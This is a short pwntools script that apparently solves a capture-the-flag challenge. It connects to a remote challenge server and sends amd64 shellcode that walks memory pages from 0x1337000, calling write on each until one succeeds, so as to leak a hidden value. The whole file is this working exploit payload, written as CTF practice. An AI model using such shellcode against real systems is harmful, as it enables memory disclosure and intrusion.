from pwn import *

#io = process('./chal')
io = remote('amt.rs', 31173)
context.arch = 'amd64'

io.recvuntil(b'> ')
payload = asm("""
mov rsi, 0x1337000
while_loop:
    add rsi, 0x1000
    
    mov rax, 1
    mov rdi, 1
    mov rdx, 50
    syscall
    
    cmp rax, 0
    jle while_loop
    mov rax, 60
    mov rdi, 0
    syscall
""")
io.sendline(payload)

io.interactive()